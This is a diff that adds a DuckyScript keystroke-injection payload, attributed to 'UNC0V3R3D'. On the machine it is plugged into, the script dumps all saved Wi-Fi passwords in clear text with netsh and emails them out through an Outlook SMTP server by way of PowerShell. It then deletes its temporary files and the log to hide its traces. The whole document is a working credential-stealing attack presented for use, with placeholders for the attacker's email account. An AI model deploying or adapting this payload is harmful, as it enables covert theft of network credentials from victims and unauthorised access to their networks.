@@ -1,0 +1,73 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Steals all of the saved Wifi Passwords and sends them via an outlook email.
+REM Version:	1.0
+REM Category:	Passwords
+DEFAULT_DELAY 600
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+STRING echo SETLOCAL EnableDelayedExpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+STRING filter.bat
+DELAY 300
+ENTER
+STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING del .\a.txt 
+ENTER
+STRING del .\b.txt 
+ENTER
+STRING del .\filter.bat
+ENTER
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL HERE', 'EMAIL PASSWORD HERE')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'YOUR EMAIL'
+ENTER
+STRING $ReportEmail.To.Add('YOUR EAMIL')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi key grabber'
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING del Log.txt
+DELAY 500
+STRING exit
+ENTER
